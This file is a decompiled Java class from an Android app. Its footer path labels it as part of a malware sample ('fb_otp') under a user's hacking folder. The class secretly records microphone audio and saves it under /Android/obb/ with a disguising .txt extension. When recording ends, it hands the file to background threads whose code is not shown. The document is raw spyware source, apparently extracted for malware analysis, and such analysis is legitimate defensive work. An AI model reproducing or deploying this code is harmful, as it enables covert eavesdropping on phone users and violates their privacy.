import android.media.MediaRecorder;
import android.os.Environment;
import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

public final class en
{
  int jdField_a_of_type_Int = 30;
  MediaRecorder jdField_a_of_type_AndroidMediaMediaRecorder;
  Boolean jdField_a_of_type_JavaLangBoolean = Boolean.valueOf(false);
  String jdField_a_of_type_JavaLangString = a(this.c);
  String b;
  String c = "/Android/obb/";
  String d = "";
  
  static String a(String paramString)
  {
    String str2 = new SimpleDateFormat("dd-MM-yyyy_HH-mm-ss").format(new Date());
    String str1 = paramString;
    if (!paramString.contains(".")) {
      str1 = paramString + str2 + ".txt";
    }
    return Environment.getExternalStorageDirectory().getAbsolutePath() + str1;
  }
  
  public final void a()
  {
    Object localObject = Environment.getExternalStorageState();
    if (!((String)localObject).equals("mounted")) {
      throw new IOException("SD Card is not mounted.  It is " + (String)localObject + ".");
    }
    localObject = new File(this.jdField_a_of_type_JavaLangString).getParentFile();
    if ((!((File)localObject).exists()) && (!((File)localObject).mkdirs())) {
      throw new IOException("Path to file could not be created.");
    }
    this.jdField_a_of_type_AndroidMediaMediaRecorder = new MediaRecorder();
    this.jdField_a_of_type_AndroidMediaMediaRecorder.setAudioSource(1);
    this.jdField_a_of_type_AndroidMediaMediaRecorder.setOutputFormat(1);
    this.jdField_a_of_type_AndroidMediaMediaRecorder.setAudioEncoder(1);
    this.jdField_a_of_type_AndroidMediaMediaRecorder.setOutputFile(this.jdField_a_of_type_JavaLangString);
    this.jdField_a_of_type_AndroidMediaMediaRecorder.prepare();
    this.jdField_a_of_type_AndroidMediaMediaRecorder.start();
    this.jdField_a_of_type_JavaLangBoolean = Boolean.valueOf(true);
  }
  
  public final void b()
  {
    this.jdField_a_of_type_JavaLangBoolean = Boolean.valueOf(false);
    this.jdField_a_of_type_AndroidMediaMediaRecorder.stop();
    this.jdField_a_of_type_AndroidMediaMediaRecorder.release();
    this.b = this.jdField_a_of_type_JavaLangString;
    new Thread(new eo(this)).start();
  }
  
  public final void c()
  {
    new Thread(new ep(this)).start();
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/fb_otp/classes-dex2jar.jar!/en.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */